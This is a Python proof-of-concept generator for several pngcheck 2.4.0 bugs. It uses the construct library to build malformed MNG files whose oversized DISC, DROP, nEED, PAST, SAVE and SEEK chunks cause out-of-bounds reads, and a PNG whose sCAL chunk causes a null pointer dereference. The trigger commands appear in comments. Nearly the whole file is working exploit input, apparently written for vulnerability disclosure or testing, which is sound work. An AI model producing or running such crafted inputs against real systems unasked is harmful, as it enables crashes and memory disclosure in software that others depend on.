#!/usr/bin/env python3
"""
PNGCheck Vulnerability POC Generator
Generates POC files demonstrating multiple vulnerabilities in pngcheck 2.4.0:

- Multiple global buffer out-of-bounds read due to unchecked 'sz' variable in MNG chunks
- Null pointer dereference of pPixheight in sCAL chunk with -f option

Each POC can be generated individually or all at once using the 'all' option.
"""

import argparse
import pathlib
import zlib

from construct import Bytes, Const, GreedyRange, Int32ub, Struct, this

Chunk = Struct(
    "length" / Int32ub,
    "type" / Bytes(4),
    "data" / Bytes(this.length),
    "crc" / Int32ub,
)

PNG = Struct(
    "signature" / Const(b"\x89PNG\r\n\x1a\n"),
    "chunks" / GreedyRange(Chunk),
)

MNG = Struct(
    "signature" / Const(b"\x8aM\x4e\x47\x0d\x0a\x1a\x0a"),
    "chunks" / GreedyRange(Chunk),
)


def create_chunk(chunk_type: bytes, chunk_data: bytes) -> dict:
    return {
        "length": len(chunk_data),
        "type": chunk_type,
        "data": chunk_data,
        "crc": zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF,
    }


def generate_poc(
    file_format: Struct, chunks: list[tuple[bytes, bytes]], output_path: pathlib.Path
) -> None:
    file_format.build_file(
        dict(chunks=[create_chunk(*chunk) for chunk in chunks]),
        output_path,
    )


# Most POCs here demonstrate a global buffer out-of-bounds read vulnerability
# caused by unchecked 'sz' variable exceeding BS in MNG chunk processing.
# The sCAL case shows a null pointer dereference when pPixheight is uninitialized.
POCS = {
    # DISC chunk
    # Command: pngcheck -v poc-disc.mng
    "disc": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (b"DISC", b"\x00\x01" * 20000),  # Large sz value
            (b"MEND", b""),
        ],
    ),
    # DROP chunk
    # Command: pngcheck poc-drop.mng
    "drop": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (b"DROP", b"ABCD" * 10000),  # Large sz value
            (b"MEND", b""),
        ],
    ),
    # nEED chunk
    # Command: pngcheck -v poc-need.mng
    "need": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (b"nEED", b"A" * 40000),  # Large sz value
            (b"MEND", b""),
        ],
    ),
    # PAST chunk
    # Command: pngcheck -f poc-past.mng
    "past": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"PAST",
                # dest_id + target_dtype + x,y coordinates + ...
                b"\x00\x01"
                + b"\x00"
                + b"\x00" * 8
                + (b"\x00" * 30) * 1500,  # Large sz value
            ),
            (b"MEND", b""),
        ],
    ),
    # SAVE chunk
    # Command: pngcheck -v poc-save.mng
    "save": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (b"SAVE", b"\x04" + b"\x00" * 40000),  # Large sz value
            (b"MEND", b""),
        ],
    ),
    # SEEK chunk
    # Command: pngcheck -v poc-seek.mng
    "seek": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (b"SAVE", b"\x04test\x00"),
            (b"SEEK", b"A" * 40000),  # Large sz value
            (b"MEND", b""),
        ],
    ),
    # sCAL chunk
    # Command: pngcheck -f poc-scal.png
    "scal": (
        PNG,
        [
            (b"IHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"),
            (b"sCAL", b"\x01" + b"1.0"),
            (b"IDAT", zlib.compress(b"\x00\x00\x00")),
            (b"IEND", b""),
        ],
    ),
}


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Generate POC files for pngcheck 2.4.0 vulnerabilities (multiple buffer "
            "out-of-bounds reads and a null pointer dereference)"
        )
    )
    parser.add_argument(
        "type",
        choices=["all"] + list(POCS.keys()),
        help="Vulnerability type to generate POC for ('all' to generate all types)",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=pathlib.Path,
        help="Output file path (default: poc-<type>.png/mng)",
    )
    args = parser.parse_args()

    if args.type == "all":
        for poc_type, (file_format, chunks) in POCS.items():
            extension = ".mng" if file_format == MNG else ".png"
            output_path = args.output or pathlib.Path(f"poc-{poc_type}{extension}")
            print(f"Generating {poc_type} chunk vulnerability POC...")
            generate_poc(file_format, chunks, output_path)
        print("POC files generated successfully")
    else:
        file_format, chunks = POCS[args.type]
        if not args.output:
            extension = ".mng" if file_format == MNG else ".png"
            args.output = pathlib.Path(f"poc-{args.type}{extension}")
        print(f"Generating {args.type} chunk vulnerability POC...")
        generate_poc(file_format, chunks, args.output)
        print("POC file generated successfully")


if __name__ == "__main__":
    main()
